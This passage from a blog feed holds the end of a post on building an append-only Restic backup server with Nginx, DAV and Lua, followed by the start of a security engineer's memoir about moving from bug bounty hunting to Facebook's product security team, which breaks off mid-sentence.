    location ~ &lt;span class="hljs-string"&gt;"^/(data|keys|locks|snapshots|index)/&lt;span class="hljs-variable"&gt;$&lt;/span&gt;"&lt;/span&gt; {
        &lt;span class="hljs-keyword"&gt;if&lt;/span&gt; (&lt;span class="hljs-variable"&gt;$request_method&lt;/span&gt; = &lt;span class="hljs-string"&gt;'GET'&lt;/span&gt;) { &lt;span class="hljs-keyword"&gt;return&lt;/span&gt; &lt;span class="hljs-number"&gt;470&lt;/span&gt;; } &lt;span class="hljs-comment"&gt;# @list_objects&lt;/span&gt;
        &lt;span class="hljs-keyword"&gt;return&lt;/span&gt; &lt;span class="hljs-number"&gt;403&lt;/span&gt;;
    }

    &lt;span class="hljs-comment"&gt;# Reading the config file and keys&lt;/span&gt;
    location ~ &lt;span class="hljs-string"&gt;"^/(config|keys/[a-f0-9]{64})&lt;span class="hljs-variable"&gt;$&lt;/span&gt;"&lt;/span&gt; {
        &lt;span class="hljs-keyword"&gt;if&lt;/span&gt; (&lt;span class="hljs-variable"&gt;$request_method&lt;/span&gt; = &lt;span class="hljs-string"&gt;'HEAD'&lt;/span&gt;) { &lt;span class="hljs-keyword"&gt;return&lt;/span&gt; &lt;span class="hljs-number"&gt;471&lt;/span&gt;; } &lt;span class="hljs-comment"&gt;# @read_object&lt;/span&gt;
        &lt;span class="hljs-keyword"&gt;if&lt;/span&gt; (&lt;span class="hljs-variable"&gt;$request_method&lt;/span&gt; = &lt;span class="hljs-string"&gt;'GET'&lt;/span&gt;)  { &lt;span class="hljs-keyword"&gt;return&lt;/span&gt; &lt;span class="hljs-number"&gt;471&lt;/span&gt;; } &lt;span class="hljs-comment"&gt;# @read_object&lt;/span&gt;
        &lt;span class="hljs-keyword"&gt;return&lt;/span&gt; &lt;span class="hljs-number"&gt;403&lt;/span&gt;;
    }

    &lt;span class="hljs-comment"&gt;# Managing lock files&lt;/span&gt;
    location ~ &lt;span class="hljs-string"&gt;"^/locks/[a-f0-9]{64}&lt;span class="hljs-variable"&gt;$&lt;/span&gt;"&lt;/span&gt; {
        &lt;span class="hljs-keyword"&gt;if&lt;/span&gt; (&lt;span class="hljs-variable"&gt;$request_method&lt;/span&gt; = &lt;span class="hljs-string"&gt;'HEAD'&lt;/span&gt;)   { &lt;span class="hljs-keyword"&gt;return&lt;/span&gt; &lt;span class="hljs-number"&gt;471&lt;/span&gt;; } &lt;span class="hljs-comment"&gt;# @read_object&lt;/span&gt;
        &lt;span class="hljs-keyword"&gt;if&lt;/span&gt; (&lt;span class="hljs-variable"&gt;$request_method&lt;/span&gt; = &lt;span class="hljs-string"&gt;'GET'&lt;/span&gt;)    { &lt;span class="hljs-keyword"&gt;return&lt;/span&gt; &lt;span class="hljs-number"&gt;471&lt;/span&gt;; } &lt;span class="hljs-comment"&gt;# @read_object&lt;/span&gt;
        &lt;span class="hljs-keyword"&gt;if&lt;/span&gt; (&lt;span class="hljs-variable"&gt;$request_method&lt;/span&gt; = &lt;span class="hljs-string"&gt;'DELETE'&lt;/span&gt;) { &lt;span class="hljs-keyword"&gt;return&lt;/span&gt; &lt;span class="hljs-number"&gt;473&lt;/span&gt;; } &lt;span class="hljs-comment"&gt;# @delete_object&lt;/span&gt;
        &lt;span class="hljs-keyword"&gt;if&lt;/span&gt; (&lt;span class="hljs-variable"&gt;$request_method&lt;/span&gt; = &lt;span class="hljs-string"&gt;'PUT'&lt;/span&gt;)    { &lt;span class="hljs-keyword"&gt;return&lt;/span&gt; &lt;span class="hljs-number"&gt;472&lt;/span&gt;; } &lt;span class="hljs-comment"&gt;# @write_object&lt;/span&gt;
        &lt;span class="hljs-keyword"&gt;if&lt;/span&gt; (&lt;span class="hljs-variable"&gt;$request_method&lt;/span&gt; = &lt;span class="hljs-string"&gt;'POST'&lt;/span&gt;)   { &lt;span class="hljs-keyword"&gt;return&lt;/span&gt; &lt;span class="hljs-number"&gt;474&lt;/span&gt;; } &lt;span class="hljs-comment"&gt;# @put_proxy&lt;/span&gt;
        &lt;span class="hljs-keyword"&gt;return&lt;/span&gt; &lt;span class="hljs-number"&gt;403&lt;/span&gt;;
    }

    &lt;span class="hljs-comment"&gt;# Reading and Writing data, index and snapshots&lt;/span&gt;
    location ~ &lt;span class="hljs-string"&gt;"^/(data|index|snapshots)/[a-f0-9]{64}&lt;span class="hljs-variable"&gt;$&lt;/span&gt;"&lt;/span&gt; {
        &lt;span class="hljs-keyword"&gt;if&lt;/span&gt; (&lt;span class="hljs-variable"&gt;$request_method&lt;/span&gt; = &lt;span class="hljs-string"&gt;'HEAD'&lt;/span&gt;) { &lt;span class="hljs-keyword"&gt;return&lt;/span&gt; &lt;span class="hljs-number"&gt;471&lt;/span&gt;; } &lt;span class="hljs-comment"&gt;# @read_object&lt;/span&gt;
        &lt;span class="hljs-keyword"&gt;if&lt;/span&gt; (&lt;span class="hljs-variable"&gt;$request_method&lt;/span&gt; = &lt;span class="hljs-string"&gt;'GET'&lt;/span&gt;)  { &lt;span class="hljs-keyword"&gt;return&lt;/span&gt; &lt;span class="hljs-number"&gt;471&lt;/span&gt;; } &lt;span class="hljs-comment"&gt;# @read_object&lt;/span&gt;
        &lt;span class="hljs-keyword"&gt;if&lt;/span&gt; (&lt;span class="hljs-variable"&gt;$request_method&lt;/span&gt; = &lt;span class="hljs-string"&gt;'PUT'&lt;/span&gt;)  { &lt;span class="hljs-keyword"&gt;return&lt;/span&gt; &lt;span class="hljs-number"&gt;472&lt;/span&gt;; } &lt;span class="hljs-comment"&gt;# @write_object&lt;/span&gt;
        &lt;span class="hljs-keyword"&gt;if&lt;/span&gt; (&lt;span class="hljs-variable"&gt;$request_method&lt;/span&gt; = &lt;span class="hljs-string"&gt;'POST'&lt;/span&gt;) { &lt;span class="hljs-keyword"&gt;return&lt;/span&gt; &lt;span class="hljs-number"&gt;474&lt;/span&gt;; } &lt;span class="hljs-comment"&gt;# @put_proxy&lt;/span&gt;
        &lt;span class="hljs-keyword"&gt;return&lt;/span&gt; &lt;span class="hljs-number"&gt;403&lt;/span&gt;;
    }

    &lt;span class="hljs-comment"&gt;# Block everything else&lt;/span&gt;
    location ~ &lt;span class="hljs-string"&gt;"^"&lt;/span&gt; {
        &lt;span class="hljs-keyword"&gt;return&lt;/span&gt; &lt;span class="hljs-number"&gt;403&lt;/span&gt;;
    }

    &lt;span class="hljs-comment"&gt;# Reading objects&lt;/span&gt;
    location @read_object {
    }

    &lt;span class="hljs-comment"&gt;# Writing objects&lt;/span&gt;
    location @write_object {

        &lt;span class="hljs-comment"&gt;# Prevent overwriting files&lt;/span&gt;
        &lt;span class="hljs-keyword"&gt;if&lt;/span&gt; (&lt;span class="hljs-operator"&gt;-f&lt;/span&gt; &lt;span class="hljs-variable"&gt;$request_filename&lt;/span&gt;) {
            &lt;span class="hljs-keyword"&gt;return&lt;/span&gt; &lt;span class="hljs-number"&gt;403&lt;/span&gt; &lt;span class="hljs-string"&gt;'No overwriting files'&lt;/span&gt;;
        }

        dav_methods PUT;
        create_full_put_path on;
        dav_access user:rw;
    }

    &lt;span class="hljs-comment"&gt;# Deleting objects&lt;/span&gt;
    location @delete_object {
        dav_methods DELETE;
        header_filter_by_lua_block {
            &lt;span class="hljs-keyword"&gt;if&lt;/span&gt; ngx.status == ngx.HTTP_NO_CONTENT then
                ngx.status = ngx.HTTP_OK
            &lt;span class="hljs-keyword"&gt;end&lt;/span&gt;
        }
    }

    &lt;span class="hljs-comment"&gt;# Listing objects&lt;/span&gt;
    location @list_objects {
        autoindex            on;
        autoindex_exact_size on;
        autoindex_format     json;

        body_filter_by_lua_block {
            chunk = ngx.arg[&lt;span class="hljs-number"&gt;1&lt;/span&gt;];
            &lt;span class="hljs-keyword"&gt;if&lt;/span&gt; string.match(chunk, &lt;span class="hljs-string"&gt;'^&amp;lt;'&lt;/span&gt;) then
                chunk = &lt;span class="hljs-string"&gt;'[]'&lt;/span&gt;
                ngx.arg[&lt;span class="hljs-number"&gt;2&lt;/span&gt;] = true
            &lt;span class="hljs-keyword"&gt;else&lt;/span&gt;
                chunk = ngx.arg[&lt;span class="hljs-number"&gt;1&lt;/span&gt;];
                chunk = ngx.re.gsub(chunk, &lt;span class="hljs-string"&gt;'\\s+'&lt;/span&gt;, &lt;span class="hljs-string"&gt;''&lt;/span&gt;)
                chunk = ngx.re.gsub(chunk, &lt;span class="hljs-string"&gt;'"(?!name|size)[^"]+":"[^"]+"'&lt;/span&gt;, &lt;span class="hljs-string"&gt;''&lt;/span&gt;)
                chunk = ngx.re.gsub(chunk, &lt;span class="hljs-string"&gt;',{2,}'&lt;/span&gt;, &lt;span class="hljs-string"&gt;','&lt;/span&gt;)
                chunk = ngx.re.gsub(chunk, &lt;span class="hljs-string"&gt;'{,'&lt;/span&gt;, &lt;span class="hljs-string"&gt;'{'&lt;/span&gt;)
                chunk = ngx.re.gsub(chunk, &lt;span class="hljs-string"&gt;',}'&lt;/span&gt;, &lt;span class="hljs-string"&gt;'}'&lt;/span&gt;)
            &lt;span class="hljs-keyword"&gt;end&lt;/span&gt;
            ngx.arg[&lt;span class="hljs-number"&gt;1&lt;/span&gt;] = chunk
        }
        header_filter_by_lua_block {
            ngx.header[&lt;span class="hljs-string"&gt;"content-type"&lt;/span&gt;] = &lt;span class="hljs-string"&gt;"application/vnd.x.restic.rest.v2"&lt;/span&gt;;
            &lt;span class="hljs-keyword"&gt;if&lt;/span&gt; ngx.status == ngx.HTTP_NOT_FOUND then
                ngx.status = ngx.HTTP_OK
                ngx.header[&lt;span class="hljs-string"&gt;"content-length"&lt;/span&gt;] = &lt;span class="hljs-number"&gt;2&lt;/span&gt;
            &lt;span class="hljs-keyword"&gt;end&lt;/span&gt;
        }
    }

    set_real_ip_from &lt;span class="hljs-number"&gt;127.0&lt;/span&gt;.&lt;span class="hljs-number"&gt;0.1&lt;/span&gt;;
    location @put_proxy {
        proxy_pass       http://&lt;span class="hljs-number"&gt;127.0&lt;/span&gt;.&lt;span class="hljs-number"&gt;0.1&lt;/span&gt;:&lt;span class="hljs-number"&gt;80&lt;/span&gt;;
        proxy_method     PUT;
        proxy_set_header Host &lt;span class="hljs-variable"&gt;$host&lt;/span&gt;;
        proxy_set_header X&lt;span class="hljs-literal"&gt;-Real&lt;/span&gt;&lt;span class="hljs-literal"&gt;-IP&lt;/span&gt; &lt;span class="hljs-variable"&gt;$remote_addr&lt;/span&gt;;
        header_filter_by_lua_block {
            &lt;span class="hljs-keyword"&gt;if&lt;/span&gt; ngx.status == ngx.HTTP_CREATED then
                ngx.status = ngx.HTTP_OK
            &lt;span class="hljs-keyword"&gt;end&lt;/span&gt;
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The config is laid out such that there are a handful of regex based location blocks at the top, which return error codes based on HTTP method, which are mapped to other location blocks below, which actually perform the requested action.&lt;/p&gt;
&lt;p&gt;I used $remote_user in the “root” so that I could give each host it’s own set of credentials to use for basic auth, which would isolate each host into their own backup directory.&lt;/p&gt;
&lt;p&gt;I had to use a few tricks to make Nginx compatible with the Restic REST API. First of all, I used the DAV module, to allow Nginx to write files. I configured it with “create_full_put_path on” so that it would recursively create parent directories. The DAV module expects PUT requests, whilst the restic client uses POST requests. There is no way of forcing the DAV module to work with POST requests, so I set up the “@put_proxy” location block, which proxies requests to localhost whilst modifying the method from POST to PUT. Not ideal, but it works. Unfortunately the DAV module returns a 204 response code, but the restic client fails unless it gets a 200, so I used the LUA Nginx module to modify the response code. I had to do this for deleting objects too.&lt;/p&gt;
&lt;p&gt;The other main difficulty was that there are certain end-points that the restic client expects to be able to get directory listings from, in a specific format. To achieve this, I used the autoindex functionality built into Nginx (in the @list_objects location block), and set it to return JSON instead of the default HTML. Luckily, the JSON format supplied by Nginx’s autoindex, is close to the one expected by Restic. It returns an array containing objects with “name” and “size” fields. Unfortunately, it returns a number of other fields, which restic isn’t expecting, and the restic client bombs out because of them. To deal with this, I used the Nginx LUA module to modify the response body to remove the unexpected fields, using regexes. Hacky, but works. I also had to configure it to return a 200 response with an empty array, instead of a 404 if the directory doesn’t exist.&lt;/p&gt;
&lt;p&gt;The admin vhost is very similar with a few small differences:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;I removed $remote_user from the “root”, meaning the admin user can access all backups at slightly different paths.&lt;/li&gt;
&lt;li&gt;I used a separate htpasswd file containing only the admin user credentials.&lt;/li&gt;
&lt;li&gt;I prefixed each location regex block to allow for parent paths containing my hostnames. E.g “^/locks/[a-f0-9]{64}$” becomes “^/[a-z0-9]+/locks/[a-f0-9]{64}$”&lt;/li&gt;
&lt;li&gt;I added the ability to delete and write to more of the location blocks, e.g to allow writing to the config/keys and deleting from index/data/snapshots.&lt;/li&gt;
&lt;li&gt;I added a new location block at the start to allow “restic init”. It doesn’t actually need to do anything, but it needs to return a 200:&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;&lt;span class="hljs-attribute"&gt;location&lt;/span&gt; &lt;span class="hljs-regexp"&gt;~ "^/[a-z0-9]+/$"&lt;/span&gt; {
    &lt;span class="hljs-attribute"&gt;if&lt;/span&gt; (&lt;span class="hljs-variable"&gt;$request_method&lt;/span&gt; = &lt;span class="hljs-string"&gt;'POST'&lt;/span&gt;) { &lt;span class="hljs-attribute"&gt;return&lt;/span&gt; &lt;span class="hljs-number"&gt;200&lt;/span&gt; &lt;span class="hljs-string"&gt;'Fake initialised'&lt;/span&gt;; }
    &lt;span class="hljs-attribute"&gt;return&lt;/span&gt; &lt;span class="hljs-number"&gt;403&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I’m not going to quote the entire admin config above. You should be able to figure it out yourself from my description if you’ve understood the config.&lt;/p&gt;
&lt;p&gt;I mentioned the Nginx DAV and LUA modules above. Don’t worry, on Debian at least, DAV is built in, and the LUA module can be used simply by doing an “apt install nginx libnginx-mod-http-lua”&lt;/p&gt;
&lt;h3 id="performance-"&gt;Performance?&lt;/h3&gt;
&lt;p&gt;I don’t have anything interesting to give you. I did some basic performance tests and didn’t find any noticable differences between the two solutions. For your use case, you may find one better than the other. Nginx is certainly a lot more tunable/configurable/customisable than Rest Server, so you may be able to do some more interesting things there. Especially when it comes to things like rate limiting or proxying to multiple backends etc.&lt;/p&gt;
&lt;h3 id="security-"&gt;Security?&lt;/h3&gt;
&lt;p&gt;If one of my hosts is compromised, that sucks. The attacker will be able to access and delete the contents of my server, but because the backups are append-only, at least they wont be able to delete them too.&lt;/p&gt;
&lt;p&gt;If my backup host is compromised, that sucks. The attacker will be able to delete my backups. But they wont be able to read them because they’re encrypted client side. And my data should still exist on the hosts that are being backed up.&lt;/p&gt;
&lt;p&gt;Administrative commands like pruning backups are run from a separate host. Hopefully that host wont become compromised as it currently has access to read, decrypt and delete all of my backups. I’m not going to say much about that host ;)&lt;/p&gt;
&lt;h3 id="simplifying-the-config"&gt;Simplifying the config&lt;/h3&gt;
&lt;p&gt;With a few small backwards compatible changes to the restic client and API, I could remove the LUA dependency, and the need to proxy write requests. I might have a look into doing this and seeing if my changes can be upstreamed, when I find some time.&lt;/p&gt;
&lt;h3 id="hosting"&gt;Hosting&lt;/h3&gt;
&lt;p&gt;I’m using a Lithuanian VPS Host named &lt;a href="https://www.time4vps.com/?affid=4501"&gt;Time4VPS&lt;/a&gt; (affiliate link) to host these backups. They have a set of very cheap “Storage VPS” plans specifically for things like backups. For example, they do a €5.99/month plan which gives you 1TB of disk and 8TB of bandwidth. They go all the way up to 64TB of disk per server. You can select from a variety of distros (including Debian and Centos), and are given full root access.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.grepular.com/redir?key=amazon_mastering_nginx" title="Mastering Nginx"&gt;&lt;img alt="" src="https://www.grepular.com/images/amazon/mastering_nginx.jpg" /&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.grepular.com/redir?key=amazon_lua_quick_start" title="LUA Quick Start"&gt;&lt;img alt="" src="https://www.grepular.com/images/amazon/lua_quick_start.jpg" /&gt;&lt;/a&gt;&lt;/p&gt;</description><pubDate>Fri, 04 Oct 2019 17:50:15 +0000</pubDate></item><item><title>From Bug Bounty Hunter, to Engineer, and Beyond</title><link>https://whitton.io/articles/from-researcher-to-engineer-and-beyond/</link><description>&lt;p&gt;A couple weeks ago I had my last day on Facebook’s Product Security team. A
bittersweet moment, but one which marks a “new chapter” in my life…&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/hunter-to-engineer/hunter-to-engineer-owasp-2.jpg"&gt;
        
            &lt;source type="image/webp" /&gt;
            &lt;source type="image/jpeg" /&gt; 
            &lt;img src="https://whitton.io/images/hunter-to-engineer/hunter-to-engineer-owasp-2.jpg" style="width: 80%;" /&gt;
        
    &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;I’ve spent just over 4 years working on &lt;a href="https://www.facebook.com/BugBounty/"&gt;“the other side”&lt;/a&gt;
of bug bounties, but it’s also been 4 years since I last blogged, so I wanted
to share some of my learnings as to how it was going from hacking on programs
to being a security engineer.&lt;/p&gt;

&lt;p&gt;I also wanted to share a bit about the journey I took. This is one of the
first times I’ve been able to fully reflect (in a kinda long, rambly way),
so writing this down was always going to be fun.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id="old-school-bug-bounty"&gt;“Old-School” Bug Bounty&lt;/h2&gt;

&lt;p&gt;Without sounding like an old-school, grey-beard hacker (I’m not &lt;em&gt;that&lt;/em&gt; old),
the landscape &lt;em&gt;really&lt;/em&gt; has changed over the ~8 years I’ve been following, and
been a part of, the bug bounty community.&lt;/p&gt;

&lt;p&gt;“Back in the day” you mainly had a choice of Google, Mozilla, Facebook and PayPal
to hack on.&lt;/p&gt;

&lt;p&gt;I have fond memories of having a Google alert setup for the words
“bug bounty” and “vulnerability disclosure program”, just so that I could find
any new program to hack on. There was also Bugcrowd’s infamous &lt;a href="https://www.bugcrowd.com/bug-bounty-list/"&gt;“The List”&lt;/a&gt;,
which I’d consult.&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/hunter-to-engineer/hunter-to-engineer-the-list.png"&gt;
        
            &lt;source type="image/webp" /&gt;
            &lt;source type="image/jpeg" /&gt; 
            &lt;img src="https://whitton.io/images/hunter-to-engineer/hunter-to-engineer-the-list.png" /&gt;
        
    &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;Aside from the limited amount of programs, the tools and techniques used to
find bugs on these various sites was wildly different than it is now.&lt;/p&gt;

&lt;p&gt;Believe it or not, even the generic, “Paste an XSS payload into a search box”,
bug taught in various old tutorials was a
&lt;a href="https://nealpoole.com/blog/2011/03/xss-vulnerability-in-facebook-translations/"&gt;valid finding on large programs&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Now, it seems like a lot of the effort put in to finding bugs is in the context
of recon - finding assets and end-points which could be pretty green and untouched,
increasing the likelihood of finding a high paying bug. This is not necessarily
a bad thing, it just means that it’s more important than ever for new-comers
to understand WebAppSec techniques &lt;em&gt;and&lt;/em&gt; the various recon tooling.&lt;/p&gt;

&lt;p&gt;(As a side note, the one program I know of which &lt;em&gt;doesn’t&lt;/em&gt; require heavy recon
is Facebook, given that it’s a single, huge domain, but I may be bias promoting
that particular program…)&lt;/p&gt;

&lt;h3 id="first-reward"&gt;First Reward&lt;/h3&gt;

&lt;p&gt;Anyway, digging through my bug bounty folder, I managed to find the first valid
bug I found, which was a CSRF issue within PayPal. This was nearly 8 years ago,
but it’s what got me hooked on something (relatively) new at the time - getting
paid to find bugs.&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/hunter-to-engineer/hunter-to-engineer-1.png"&gt;
        
            &lt;source type="image/webp" /&gt;
            &lt;source type="image/jpeg" /&gt; 
            &lt;img src="https://whitton.io/images/hunter-to-engineer/hunter-to-engineer-1.png" /&gt;
        
    &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;I’d sent in a few bugs prior to this, both to PayPal and Facebook, but receiving
a “you’ve found an eligible issue” email felt great, despite the finding being
pretty low-risk.&lt;/p&gt;

&lt;h3 id="ramping-up"&gt;Ramping Up&lt;/h3&gt;

&lt;p&gt;From this point, I knew I needed to do two things:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Learn as much as I could from other, more established researchers to understand
their techniques for finding bugs (and the common patterns seen across a program)&lt;/li&gt;
  &lt;li&gt;Find as many bugs as possible - in hindsight, this is not the best idea (as
most programs value quality over quantity), but while I was starting out, it helped
me get an idea of validity, and the non-technical aspects of writing reports etc&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;I also started blogging about my findings. The reason behind this was that I
wanted to share some info back to the community that I’d learnt so much from.
The other reason (which, IMO, is also a common reason) was that I could leverage
these public blog posts into a job offer within the security industry. My background
at the time was as a web developer, with no university degree or qualifications.&lt;/p&gt;

&lt;p&gt;So from here, I hunted and hunted and hunted. The Yahoo program launched at some
point in 2013 and it was &lt;em&gt;so&lt;/em&gt; fun. Got some great findings and responses, including
the following email I recently found buried in a screenshot folder somewhere.&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/hunter-to-engineer/hunter-to-engineer-2013-10-31.png"&gt;
        
            &lt;source type="image/webp" /&gt;
            &lt;source type="image/jpeg" /&gt; 
            &lt;img src="https://whitton.io/images/hunter-to-engineer/hunter-to-engineer-2013-10-31.png" /&gt;
        
    &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;Once they started paying their findings out via HackerOne, I had the (brief)
enjoyment of being “The Top Hacker™”. That too was buried in a screenshot folder.&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/hunter-to-engineer/hunter-to-engineer-h1-feed.jpg"&gt;
        
            &lt;source type="image/webp" /&gt;
            &lt;source type="image/jpeg" /&gt; 
            &lt;img src="https://whitton.io/images/hunter-to-engineer/hunter-to-engineer-h1-feed.jpg" /&gt;
        
    &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;Around the same time, I started spending more and more time exclusively on the
Facebook program.&lt;/p&gt;

&lt;p&gt;This is a trend I still see today - as you hack more and more
on the same program, you start to get a sense for how the code is written (despite
black-boxing it), for when new code is deployed (despite not having access to the
CI infra), and for when a mistake may have been made (which is when you turn
that “spidey sense” into a valid submission).&lt;/p&gt;

&lt;h3 id="facebook-bug-bounty"&gt;Facebook Bug Bounty&lt;/h3&gt;

&lt;p&gt;The Facebook Bug Bounty program is where I spent the majority of my free time.
I never made #1 on &lt;a href="https://www.facebook.com/whitehat/thanks"&gt;their leaderboard&lt;/a&gt; (always #2…), but I found some fun bugs
and wrote up some &lt;a href="https://whitton.io/tags/#facebook"&gt;interesting posts&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Over time I got to &lt;em&gt;really&lt;/em&gt; understand the code behind www, despite never
having seen it. The majority of findings are what would be called &lt;a href="https://portswigger.net/web-security/access-control/idor"&gt;IDORs&lt;/a&gt;,
although “bypassing read/write privacy” is a nicer term IMO.&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/hunter-to-engineer/hunter-to-engineer-2013-10-15.png"&gt;
        &lt;img src="https://whitton.io/images/hunter-to-engineer/hunter-to-engineer-2013-10-15.png" /&gt;
    &lt;/a&gt;
    &lt;figcaption&gt;One of many fun screenshots from the Whitehat program&lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;My biggest finding came when I found a way of accessing anyone’s account. This
bug was one of the most simple, generic IDORs you could think of (change “profile_id” to someone else’s user ID…),
but as with most programs, Facebook pays based on impact not on complexity.&lt;/p&gt;

&lt;p&gt;For this bug, and others, they issued me one of the coveted Whitehat Debit Cards.
It was fun (read: &lt;em&gt;slightly&lt;/em&gt; annoying) having credit card receipts issued to
Mr. Bounty.&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/hunter-to-engineer/hunter-to-engineer-whitehat-debit-card.jpg"&gt;
        &lt;img src="https://whitton.io/images/hunter-to-engineer/hunter-to-engineer-whitehat-debit-card.jpg" style="width: 80%;" /&gt;
    &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;Understandably, these aren’t used anymore as loading up and sending out thousands
of cards per year would be too much, but back then the card itself was worth
(to me, in terms of sentimental value) almost as much as the dollar reward.&lt;/p&gt;

&lt;p&gt;After a few years of hacking Facebook spun up a ProdSec team in London,
which was perfect as I’m based in the UK and didn’t want to leave to go to America.&lt;/p&gt;

&lt;p&gt;I got the opportunity to interview for the role of Product Security Engineer,
went to the office, did the interview…&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id="joining-facebook"&gt;Joining Facebook&lt;/h2&gt;

&lt;p&gt;…and failed. It sucked - joining Facebook was one of the end-goals of me
spending so much time hacking on their program. But the reason I’m mentioning this
(likely for the first time) is that in terms of a career, going back and having
to re-learn some areas that you’re not 100% at isn’t a huge deal. I
re-interviewed a while later and then joined in April 2016.&lt;/p&gt;

&lt;p&gt;My first day was such a surreal experience. For years I knew the website inside
and out, but finally I got a laptop with a check-out of the codebase.&lt;/p&gt;

&lt;p&gt;_Spoiler: this post doesn’t contain any NDA-breaching info that will help you find bugs in Facebook.
If you really want access to the secret codebase, &lt;strong&gt;&lt;a href="https://www.facebook.com/careers"&gt;click here&lt;/a&gt;_&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;I went through the usual bootcamp process that Facebook has, and finally joined
the team to start looking for bugs and suggesting improvements to various product
teams. This was when I made the (virtual) switch from being a “hunter” to an “engineer”.&lt;/p&gt;

&lt;h3 id="everything-is-a-p0"&gt;“Everything is a P0”&lt;/h3&gt;

&lt;p&gt;A mindset that I &lt;em&gt;needed&lt;/em&gt; to shift out of when joining Facebook was a common one
that a lot of researchers have, and that’s that “every finding is a P0, you
&lt;strong&gt;must&lt;/strong&gt; fix this now, if you don’t the world will end and society will collapse”.&lt;/p&gt;

&lt;p&gt;Now, there &lt;em&gt;could&lt;/em&gt; be the odd bug where this is the case, but most of the time
when working with a product team you need to understand trade-offs, and come
up with solutions that are fair to other areas other than security.&lt;/p&gt;

&lt;p&gt;You could be the most l33t researcher, dropping 0-days and absolutely crushing it,
but if you can’t articulate risk to a &lt;em&gt;non&lt;/em&gt; security engineer, then it’s not going
to work out.&lt;/p&gt;

&lt;h3 id="running-a-program"&gt;Running a Program&lt;/h3&gt;

&lt;p&gt;Given that my background is in bug bounties, it made sense for me to start
working on Facebook’s own program. This too needed a bit of a mindset switch -
I’d never triaged a report before, never looked for a root cause (other than in
client-side JS), nor sat in on a payout meeting to discuss reward amounts.&lt;/p&gt;

&lt;p&gt;But one thing that I could bring to the program was the empathy aspect, given
that I’d been on the &lt;em&gt;receiving&lt;/em&gt; end of messages and updates from a bug bounty
program many times (one thing to note here is that this wasn’t a unique skill -
at the time, and even more so now, some of the engineers working on Whitehat
had bug bounty experience).&lt;/p&gt;

&lt;h3 id="researcher-engagement"&gt;Researcher Engagement&lt;/h3&gt;

&lt;p&gt;One part of my role at Facebook that I kinda “accidentally” fell in to was
giving presentations to researchers about our team, and the Whitehat program.
It started off as something that I wasn’t sure I wanted to do - public
speaking was a pretty big fear of mine, but I had an awesome manager who
helped me overcome this fear.&lt;/p&gt;

&lt;p&gt;But, after giving my first external presentation at Nullcon in 2017, I
realised this was something I actually &lt;em&gt;really&lt;/em&gt; enjoyed. Being able to share
some “inside tips” on how people could succeed in the world of bug bounties
was rewarding.&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/hunter-to-engineer/hunter-to-engineer-nullcon.jpg"&gt;
        &lt;img src="https://whitton.io/images/hunter-to-engineer/hunter-to-engineer-nullcon.jpg" style="width: 80%;" /&gt;
    &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;These presentations, and focus groups run with researchers, allowed me to
understand the pain points and help ensure that researchers were enjoying
their experience with the program.&lt;/p&gt;

&lt;p&gt;In fact, this will be probably the biggest thing I’ll miss from Whitehat.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id="finding-bugs-as-an-engineer"&gt;Finding Bugs as an Engineer&lt;/h2&gt;

&lt;p&gt;Whilst I was at Facebook, I did have the chance to find bugs in other programs,
but my throughput went down massively. Prior to my start date, I was hunting
most days and finding valid bugs in most of those sessions. However, after
joining, these were the only months I hacked during (and some of these only
ended up with one or two valids):&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/hunter-to-engineer/hunter-to-engineer-2.png"&gt;
        &lt;img src="https://whitton.io/images/hunter-to-engineer/hunter-to-engineer-2.png" /&gt;
    &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;Given that my day was full up with engineering work, investigating security
bugs, etc, I took the decision to ensure that my &lt;em&gt;free time&lt;/em&gt; was full of
non-work related things (for more info, you should really read NathOnSecurity’s post
regarding &lt;a href="https://medium.com/@NathOnSecurity/bug-bounties-and-mental-health-40662b2e497b"&gt;Bug Bounties and Mental Health&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;But for the few times I was hunting, the technical and non-technical skills I was
learning and using from helping run the Whitehat program, and from security
reviews for teams, helped greatly:&lt;/p&gt;

&lt;h3 id="visualing-code"&gt;Visualing Code&lt;/h3&gt;

&lt;p&gt;After reviewing enough code (which believe me, I did…), you start to be able
to visualise how a request is being handled. This is usually regardless of the
application, or language it’s written in, given that in most cases it’ll be roughly
similar.&lt;/p&gt;

&lt;p&gt;In terms of bug bounty, this helped a lot. I could look at an end-point,
